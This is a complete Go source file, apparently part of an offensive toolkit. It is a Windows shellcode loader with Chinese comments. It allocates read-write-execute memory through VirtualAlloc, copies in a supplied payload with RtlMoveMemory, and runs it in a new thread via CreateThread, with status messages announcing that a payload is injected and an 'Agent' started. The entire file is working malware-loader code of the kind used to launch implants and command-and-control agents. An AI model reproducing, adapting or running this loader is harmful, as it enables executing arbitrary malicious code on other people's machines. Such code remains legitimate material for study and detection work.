package inject

import (
	"fmt"
	"syscall"
	"unsafe"
)

var (
	kernel32            = syscall.NewLazyDLL("kernel32.dll")
	ntdll               = syscall.NewLazyDLL("ntdll.dll")
	VirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	RtlMoveMemory       = ntdll.NewProc("RtlMoveMemory")
	CreateThread        = kernel32.NewProc("CreateThread")
	WaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

// Execute 将 Shellcode 注入内存并执行
func Execute(shellcode []byte) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode 为空")
	}

	fmt.Printf("[+] 载荷已就绪: %d 字节\n", len(shellcode))

	// 1. 申请内存
	addr, _, err := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return fmt.Errorf("内存申请失败: %v", err)
	}
	fmt.Printf("[+] 内存申请成功: 0x%x\n", addr)

	// 2. 写入 Shellcode
	_, _, _ = RtlMoveMemory.Call(
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)
	fmt.Println("[+] Payload 已注入内存")

	// 3. 创建线程执行
	thread, _, err := CreateThread.Call(0, 0, addr, 0, 0, 0)
	if thread == 0 {
		return fmt.Errorf("线程创建失败: %v", err)
	}
	fmt.Println("[+] 载荷已注入。Agent 启动。")

	// 4. 等待线程执行完成（阻止进程退出）
	WaitForSingleObject.Call(thread, 0xFFFFFFFF)
	
	return nil
}
